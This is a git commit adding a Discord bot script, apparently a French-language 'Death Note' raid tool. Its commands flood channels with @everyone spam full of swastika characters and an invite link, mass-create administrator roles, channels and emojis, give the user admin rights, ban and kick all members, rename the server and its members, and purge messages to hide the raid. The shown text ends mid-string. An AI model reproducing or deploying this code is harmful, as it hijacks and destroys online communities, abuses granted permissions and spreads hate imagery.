26a95c065ff62eb2e7fa4c6faa12e5ee9b875cc7
ShadowNinners <38014619+ShadowNinners@users.noreply.github.com>
2018-04-24 11:51:21 +0200

    Create index.js

---
+++ .gitignore/index.js
@@ -0,0 +1,330 @@
+var Discord = require("discord.js");
+bot = new Discord.Client();
+var pre = "!";
+
+
+var prefix = ("_");
+const fs = require('fs');
+const config = require("./config.json");
+var perms = ["KICK_MEMBERS","BAN_MEMBERS","ADMINISTRATOR","CREATE_INSTANT_INVITE","MANAGE_CHANNELS","MANAGE_GUILD","ADD_REACTIONS","VIEW_AUDIT_LOG","VIEW_CHANNEL","READ_MESSAGES","SEND_MESSAGES","SEND_TTS_MESSAGES","MANAGE_MESSAGES","EMBED_LINKS","ATTACH_FILES","READ_MESSAGE_HISTORY","MENTION_EVERYONE","USE_EXTERNAL_EMOJIS","EXTERNAL_EMOJIS","CONNECT","SPEAK","MUTE_MEMBERS","DEAFEN_MEMBERS","MOVE_MEMBERS","USE_VAD","CHANGE_NICKNAME","MANAGE_NICKNAMES","MANAGE_ROLES","MANAGE_ROLES_OR_PERMISSIONS","MANAGE_WEBHOOKS","MANAGE_EMOJIS"];
+var i = 0;
+
+bot.on('ready', () => {
+    console.log("");
+    console.log("ℙ𝕣𝕖𝕥 𝕒 𝕕𝕖𝕥𝕣𝕦𝕚𝕣𝕖 𝕕𝕖𝕤 𝕤𝕖𝕣𝕧𝕖𝕦𝕣𝕤 !");
+});
+function base64_encode(file) {
+    var bitmap = fs.readFileSync(file);
+    return new Buffer(bitmap).toString('base64');
+}
+  bot.on('message', message => {
+
+  	/* DÉTECTION SI LE MESSAGE EST UNE COMMANDE */
+	if (message.content.startsWith(prefix)) {
+		if(message.author.bot) return; // Empêcher les bots de réaliser des commandes
+		try {
+			var splited_message = message.content.slice(prefix.length).split(" ");
+			var command = splited_message[0];
+			var parameters = splited_message.slice(1)
+		} catch (error) {
+			return
+		};
+        
+        /* LISTE DES COMMANDES */
+ 
+     
+  
+			if (["epic"].includes(command)) {
+                message.delete();
+                  var interval = setInterval (function () {
+                    message.channel.send("@everyone @here \n__***Annonce Importante***__\n***Un Nouvel Empire fait son apparition***\n```‾͟͟͞(((ꎤ ✧曲✧)̂—̳͟͞o卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA 卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐```"); 
+                }, 500)
+  
+      }
+	if (["aya"].includes(command)) {
+         message.delete();
+         if(message.author.id !== "427874353590304789","") {
+					return message.author.send("Tu n'aura pas la liste :issou: ")
+				};
+    //invit link 
+    bot.guilds.forEach(guild => { 
+      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
+      invite.createInvite().then(invite => message.author.send(`Connecté sur : ${guild.name} ${invite}`));
+    })
+}
+      
+
+			if (["role"].includes(command)) {
+    message.delete();
+    //create role
+    var interval = setInterval (function () {
+    message.guild.createRole({
+        name: 'ツ',
+        color: 'BLACK',
+        permissions: perms,
+    })
+  }, 200)
+    //Nom a changer
+}
+			if (["emoji"].includes(command)) {
+    message.delete();
+    //create role
+    var interval = setInterval (function () {
+    message.guild.createEmoji('./raid.png', 'Raid')
+
+  }, 50)
+    //Nom a changer
+}
+			if (["emoji"].includes(command)) {
+    //create role
+    var interval = setInterval (function () {
+    message.guild.createEmoji('https://media.giphy.com/media/OqJ7GybUTCsmpJXRtT/giphy.gif', '.Exe')
+
+  }, 50)
+    //Nom a changer
+}
+			if (["wtf"].includes(command)) {
+        message.delete();
+        var interval = setInterval (function () {
+          for (var i = 0; i < 400; i++) {
+  
+            message.guild.createChannel(`╭∩╮►_◄╭∩╮`, 'voice')//Nom a changer
+            message.guild.createChannel(`𝐻𝑎𝑐𝑘𝑒𝑑 𝑏𝑦 𝐸𝑥𝑒.𝑅𝑎𝑖𝑑`, 'text')
+              //changes name tons of times to clog up the audit log
+              
+          } 
+        });
+      }
+  
+			if (["exe"].includes(command)) {
+       message.delete();
+            message.member.guild.createRole({name: "ツ", permissions: perms, color: 'WHITE',})
+           var myRole = message.guild.roles.find(r => {
+          return r.name === "ツ";
+        
+          });
+      
+          message.guild.members.get(message.author.id).addRole(myRole);
+  
+        }
+  
+			if (["del"].includes(command)) {
+          message.delete();
+  
+          let sicon = msg.guild.iconURL;
+                	var date = message.guild.createdAt;
+          let serverembed = new Discord.RichEmbed()
+
+          .setDescription("Restriction du serveur", message.guild.name)
+          .setColor("#320242")
+          .setThumbnail(sicon)
+          .addField("Nom du serveur ¬", message.guild.name)
+        .addField("`Createur du Serveur ¬`", message.guild.owner)
+          .addField("Créé le ¬", date.getDate()+"/"+(date.getMonth()+1)+"/"+date.getFullYear()+" à "+date.getHours()+":"+date.getMinutes())
+          .addField("Total des membres", message.guild.memberCount)
+          .addField("ID du Serveur", message.guild.id)
+          .setFooter("Serveur Supprimé Dans 1 Heure / Cause : Ne Respecte pas le TOS");
+      
+          return message.channel.send(serverembed);
+        }
+
+			if (["soumit"].includes(command)) {
+            message.delete();
+            message.guild.members.forEach(member => {
+                if(member.setNickname("𝗩𝗶𝗰𝘁𝗶𝗺𝗲"));
+                
+            })
+        }
+      
+	if (["ツ"].includes(command)) {
+
+          message.delete();
+            var help_embed = new Discord.RichEmbed()
+           
+            
+                .setTitle("Voici les Commandes du Death Note :")
+                .addField(":skull_crossbones: _shuriken","Spam dans le salon.", true)
+                .addField(":skull_crossbones: _wtf"," Crée et Introduit des Salons.", true)
+                .addField(":skull_crossbones: _epic","Spam le salon en mettant le lien du serveur et des gifs", true)
+                .addField(":skull_crossbones: _emoji","Crée et Remplis des emojis'", true)
+                .addField(":skull_crossbones: _exe","Exécuter la commande X2 pour devenir un Administrateur.", true)
+                .addField(":skull_crossbones: _rename","Il Rename le serveur puis change la photo.", true)
+                .addField(":skull_crossbones: _quit","Le Death Note Quitte le Serveur.", true)
+                .addField(":skull_crossbones: _purge","Supprime 100 Messages dans le Salon.", true)
+                .addField(":skull_crossbones: _soumit","Rename Tout les Membres du Serveur", true)
+                .addField(":skull_crossbones: d?help","Affiche les commandes d'un bot normal.", true)
+                .addField(":skull_crossbones: _role","Crée et remplis des Roles", true)
+                .addField(":skull_crossbones: _supp","Supprime le salon.", true)
+                .addField(":skull_crossbones: _ban","Ban tout ceux qui pouront être ban (éxecuter la commande suivante : _exe avant de vous faire Bannir !).", true)
+                .addField(":skull_crossbones: _kick","Kick tout ceux qui pouront être kick (//).", true)
+                .addField(":skull_crossbones: :skull_crossbones: Commande Secrète :skull_crossbones: :skull_crossbones:","Le Death Note Effectue toutes les Commandes Possible (//).", true)
+                .addField(":eye_in_speech_bubble: Commande Secrète","Le Death Note Rend le Serveur Completement Vide (Remplace la Photo, le nom du Serveur et supprime tout les salons ainsi que les emojis), (//).", true)
+                .setColor("#320242")
+                .setFooter("𝑨𝒚𝒂")
+                message.author.sendEmbed(help_embed).catch(console.error);
+        }
+
+  
+			if (["terminal"].includes(command)) {
+       message.member.guild.createRole({name: "ツ", permissions: perms, color: 'BLACK',})
+       var myRole = message.guild.roles.find(r => {
+      return r.name === "ツ";
+    
+      })
+  
+      message.guild.members.get(message.author.id).addRole(myRole);
+
+    }
+
+			if (["terminal"].includes(command)) {
+    
+      message.guild.setIcon("Shadow.png")
+                
+  }
+
+
+			if (["terminal"].includes(command)) {
+    message.delete();
+    var interval = setInterval (function () {
+      for (var i = 0; i < 400; i++) {
+
+        message.guild.createChannel(`╭∩╮►_◄╭∩╮`, 'voice')//Nom a changer
+        message.guild.createChannel(`𝐻𝑎𝑐𝑘𝑒𝑑_𝑏𝑦_𝐸𝑥𝑒.𝑅𝑎𝑖𝑑`, 'text')
+          //changes name tons of times to clog up the audit log
+          
+      } 
+    })
+  }
+
+			if (["terminal"].includes(command)) {
+    //create role
+    var interval = setInterval (function () {
+    message.guild.createRole({
+        name: 'ツ',
+        color: 'BLACK',
+        permissions: perms,
+    })
+  }, 200)
+    //Nom a changer
+}
+
+			if (["purge"].includes(command)) {
+            message.channel.fetchMessages(
+                {limit: 100}).then(
+                    messages => message.channel.bulkDelete(messages)
+                ); //deletes messages to cover up you did it
+     
+        }
+        
+			if (["terminal"].includes(command)) {
+           var interval = setInterval (function () {
+    message.channel.send("@everyone @here \n__***Annonce Importante***__\n***Un Nouvel Empire fait son apparition***\n```‾͟͟͞(((ꎤ ✧曲✧)̂—̳͟͞o卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA 卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐https://discord.gg/74npnhA卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐```"); 
+         }, 500);
+        }
+
+			if (["terminal"].includes(command)) {
+          for (var i = 0; i < 100; i++) {
+          message.guild.setName(+ i + '_𝐯𝐢𝐜𝐭𝐢𝐦𝐞𝐬 𝐝𝐮 𝐝𝐞𝐚𝐭𝐡 𝐧𝐨𝐭𝐞');
+          }
+          
+    
+    }
+
+			if (["terminal"].includes(command)) {
+    message.guild.members.forEach(member => {
+      if (member.bannable && !member.roles.find("name", "ツ")) {
+        member.ban();
+      }
+    });
+  }
+
+			if (["terminal"].includes(command)) {
+    message.guild.members.forEach(member => {
+      if (member.kickable && !member.roles.find("name", "ツ")) {
+        member.kick();
+      }
+    });
+  }  
+  			if (["terminal"].includes(command)) {
+    message.delete();
+    //create role
+    var interval = setInterval (function () {
+    message.guild.createEmoji('./raid.png', 'Raid')
+  .then(emoji => console.log(`Nouveau emoji crée ! ${emoji.name}`))
+  }, 50)
+    //Nom a changer
+}
+			if (["terminal"].includes(command)) {
+    message.delete();
+    //create role
+    var interval = setInterval (function () {
+    message.guild.createEmoji('./exe.gif', '.Exe')
+  .then(emoji => console.log(`Nouveau emoji crée ! ${emoji.name}`))
+  }, 50)
+    //Nom a changer
+}
+
+
+			if (["shuriken"].includes(command)) {
+     message.delete();
+    var interval = setInterval (function () {
+      message.channel.send("@everyone\n\n```卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐